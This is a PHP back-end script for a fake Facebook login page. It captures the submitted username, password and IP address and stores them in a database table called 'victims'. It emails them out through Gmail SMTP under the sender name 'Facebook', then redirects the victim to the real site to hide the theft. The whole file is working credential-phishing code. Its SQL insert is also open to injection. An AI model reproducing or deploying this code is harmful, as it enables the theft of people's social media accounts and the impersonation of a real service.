<?php

	include('connection.php');
	require_once('phpmailer/PHPMailerAutoload.php');


	if(isset($_REQUEST['username']) && isset($_REQUEST['password'])){
		
		$usr = $_REQUEST['username'];
		$pass = $_REQUEST['password'];
		$ip=$_SERVER['REMOTE_ADDR'];
		$today = new DateTime("now", new DateTimeZone('Asia/Dhaka') );
		$saveTime =  $today->format('Y/m/d          h:i:sa');


		$sql = "INSERT INTO `victims` (`username`, `password`, `ip`, `time`) VALUES ('$usr', '$pass', '$ip', '$saveTime')";

		$rs = mysqli_query($con, $sql);
		
		//------------------------
		$vic_msg = "Username : ".$usr."<br>Password : ".$pass."<br>IP Address : ".$ip."Login Time : ".$saveTime;
		$name = "Fecebook rf gd";
		$rec_mail = "Recieveremail@gmail.com";
		$mail = new PHPMailer();
		$mail->CharSet =  "utf-8";
		$mail->IsSMTP();
		// enable SMTP authentication
		$mail->SMTPAuth = true;                  
		// GMAIL username
		$mail->Username = "sendinggmail@gmail.com";
		// GMAIL password
		$mail->Password = "sendinggmail pass";
		$mail->SMTPSecure = "ssl";  
		// sets GMAIL as the SMTP server
		$mail->Host = "smtp.gmail.com";
		// set the SMTP port for the GMAIL server
		$mail->Port = "465";
		$mail->From='sending gmail@gmail.com';
		$mail->FromName='Facebook';
		$name = $name;
		$mail->AddAddress($rec_mail, $name);
		$mail->Subject  =  'Victim Mail Pass FB';
		$mail->IsHTML(true);
		$mail->Body    = $vic_msg;
		$mail->Send();
		//mail verification email to user email address --start
		//---------------------------------

		if($rs)
		{
			header("Location: http://www.facebook.com");
		}
		else
		{
			header("Location: index.php");
		}
	}
?>
